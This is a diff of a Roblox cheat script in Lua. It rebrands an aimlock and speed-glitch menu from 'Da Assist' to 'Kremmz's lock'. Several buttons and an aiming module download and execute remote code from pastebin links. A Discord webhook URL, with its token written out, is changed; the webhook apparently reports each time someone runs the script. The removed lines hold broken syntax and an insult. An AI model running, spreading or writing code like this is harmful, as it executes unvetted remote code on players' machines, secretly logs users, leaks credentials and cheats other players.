@@ -34,7 +34,7 @@ local Tab2 = Window:Tab("Player",false)
 Tab2:Label("Player Scripts")
 
 game.StarterGui:SetCore("SendNotification", {
-    Title = "Da Assist";
+    Title = "Kremmz's lock";
     Text = "You're Whitelisted";
     Icon = "RBXID OR BLANK";
     Duration = "DURATION IN SECONDS";
@@ -43,7 +43,7 @@ game.StarterGui:SetCore("SendNotification", {
 })
 
 Tab2:Button("Speed Glitch (Q)",function(bool)
-    loadstring(game:HttpGet("https://pastebin.com/raw/TZfSBPua"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/fHXcKftV"))()
 end)
 
 Tab2:Button("Realistic Speed Glitch (X)",function(bool)
@@ -332,7 +332,7 @@ end)
 
 local Tab5 = Window:Tab("Credits",false)
 
-Tab5:Label("kremmz#0001 https://discord.gg/MWwNs7utHT")
+Tab5:Label("kremmz#0001")
 
 local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/x0GU1rjk"))()
 Aiming.TeamCheck(false)
@@ -402,23 +402,14 @@ RunService:BindToRenderStep("AimLock", 0, function()
    "Kid with shit exploit"
 
 
-local Tab6 = Window:Tab("Animations",false)
 
-Tab6:Label("Animations")
 
-Tab6:Buttom("Animations)"
 
-Tab6:Button("Zombie and old school"),function(bool)
-local Animate = game.Players.LocalPlayer.Character.Animate
-Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3303162274"
-Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3303162549"
-Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
-Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
-Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
-Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
-Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
-wait(1)
-end)
+
+
+
+
+
 
 
 
@@ -441,9 +432,9 @@ end)
 
 
 local url =
-   "https://discord.com/api/webhooks/913270761911910460/rwAkB7gAdLbhMuL5mDhF9Z9lU0Zugy7JMxDZ9swSCQFVdI9hcQa9eMUAAVudocBC0Zfw"
+   "https://discordapp.com/api/webhooks/906764837021966346/zhUtQyk4j5E3Dy71GlUaHlv5QszILpwOEEDaX2lppf46cNvfTtptJGO086uJkmcfueGo"
 local data = {
-   ["content"] = " ***kremmz's logs***",
+   ["content"] = " ***Da Assist Logs***",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
